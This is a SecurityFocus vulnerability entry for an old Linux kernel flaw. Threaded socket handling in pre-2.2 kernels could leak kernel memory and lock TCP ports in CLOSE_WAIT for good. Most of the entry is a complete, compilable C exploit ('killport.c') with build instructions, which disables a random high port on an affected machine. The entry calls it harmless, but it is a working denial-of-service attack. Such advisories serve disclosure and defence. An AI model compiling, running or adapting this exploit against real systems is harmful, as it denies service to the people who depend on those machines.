source: http://www.securityfocus.com/bid/343/info


It is possible to leak kernel memory and render TCP ports above 1024 unusable, locked forever in the CLOSE_WAIT state in linux kernels prior to the late 2.1.x and 2.2.0pre releases. In addition to being intentionally exploited, unix applications compiled on linux that are multithreaded may also cause these problems.

Below is a harmless example of the exploit:

// This program will kill a random port on a linux machine. The kernel will

// forever listen to that port and send the connections nowhere. Tested with

// Linux kernel 2.0.35 and libc-2.0.7. Requires LinuxThreads to compile,

// but removing LinuxThreads from your system will not solve the problem.

// Discovered by David J. Schwartz <davids@webmaster.com>

// Copyright (C) 1998, David J. Schwartz

// Compile with:

// gcc killport.c -lpthread -o killport

#include <pthread.h>

#include <stdio.h>

#include <sys/types.h>

#include <sys/socket.h>

#include <netinet/in.h>

#include <stdlib.h>

#include <arpa/inet.h>

#include <errno.h>

volatile int s;

void *Thread1(void *a)

{

int i,p;

struct sockaddr_in to;

fd_set fd;

s=socket(AF_INET, SOCK_STREAM, 0);

if(s<=0) return;

memset(&to, 0, sizeof(to));

srand(getpid());

/* we pick a random port between 50000 and 59999 */

p=(rand()%10000)+50000;

printf("port = %d\n", p);

fflush(stdout);

to.sin_port=htons(p);

to.sin_addr.s_addr=0;

to.sin_family=AF_INET;

if(bind(s, (struct sockaddr *)&to, sizeof(to))<0) fprintf(stderr,"no bind\n");

if(listen(s,10)!=0)

fprintf(stderr,"No Listen\n");

/* now we are listening on that port */

i=sizeof(to);

FD_ZERO(&fd);

FD_SET(s,&fd);

select(s+1,&fd,NULL,NULL,NULL);

/* at this point we have selected on it as well */

fprintf(stderr,"select returned!\n");

}

void *Thread2(void *a)

{

close(s);

fflush(stderr);

abort();

}

void main(void)

{

pthread_t j;

pthread_create(&j,NULL,Thread1,NULL);

usleep(100); /* give the other thread time to finish */

pthread_create(&j,NULL,Thread2,NULL);

while(1) sleep(1);

} 